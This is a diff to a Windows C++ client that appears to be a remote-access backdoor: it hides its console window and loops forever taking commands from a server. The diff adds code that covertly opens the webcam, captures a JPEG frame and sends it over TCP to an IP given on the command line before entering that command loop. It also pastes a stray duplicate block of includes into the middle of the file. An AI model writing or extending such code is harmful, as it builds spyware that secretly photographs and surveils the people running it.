@@ -11,6 +11,9 @@
 #include <cstring>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <chrono>
+#include <opencv2/opencv.hpp>
+#include <thread>
 
 // void deamonize(){
 //     pid_t pid = fork();
@@ -142,22 +145,68 @@ void handle_server_commands(SOCKET sock){
     }
 }
 
-int main() {
+#include <iostream>
+#include <vector>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <opencv2/opencv.hpp>
+
+int main(int argc, char* argv[]) {
     ShowWindow(GetConsoleWindow(), SW_HIDE); 
 
     WSAData wsaData; 
-
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         std::cerr << "WSAStartup failed" << std::endl;
         return 1;
     }
 
-    const char* server_ip = "127.0.0.1";
+    cv::VideoCapture cap(0);
+    if(!cap.isOpened()) {
+        std::cerr << "Error opening camera" << std::endl;
+        WSACleanup();
+        return -1;
+    }
+
+    std::vector<uchar> buffer;
+    cv::Mat frame;
+    for(int i = 0; i < 5; ++i){
+        cap >> frame;
+    }
+    cv::imencode(".jpg", frame, buffer);
+    cap.release();
+
+    SOCKET clientsock = socket(AF_INET, SOCK_STREAM, 0);
+    if (clientsock == INVALID_SOCKET) {
+        std::cerr << "Socket error" << std::endl;
+        WSACleanup();
+        return 1;
+    }
+
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(8080);
+    const char* target_ip = (argc > 1) ? argv[1] : "127.0.0.1";
+    inet_pton(AF_INET, target_ip, &addr.sin_addr);
+
+    int connResult = connect(clientsock, (struct sockaddr*)&addr, sizeof(addr));
+    if(connResult == SOCKET_ERROR) {
+        closesocket(clientsock);
+        WSACleanup();
+        return 1;
+    }
+
+    int image_size = buffer.size();
+    send(clientsock, (const char*)&image_size, sizeof(image_size), 0);
+
+    send(clientsock, (const char*)buffer.data(), buffer.size(), 0);
+
+    closesocket(clientsock);
+
+    const char* server_ip = (argc > 1) ? argv[1] : "127.0.0.1";
     int server_port = 8080;
 
     while(true) {
         SOCKET active_socket = establish_connection(server_ip, server_port);
-        
         handle_server_commands(active_socket);
     }
 
